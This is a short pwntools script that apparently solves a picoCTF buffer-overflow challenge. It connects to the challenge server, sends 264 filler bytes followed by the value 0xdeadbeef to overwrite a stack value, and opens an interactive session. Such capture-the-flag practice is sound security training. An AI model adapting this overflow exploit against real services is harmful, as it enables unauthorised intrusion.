from pwn import *

p = remote('mars.picoctf.net', 31890)

p.recvuntil(b'?\n')

offset = b'A' * 264
payload = 0xdeadbeef
p.sendline(offset + p64(payload))
p.interactive()

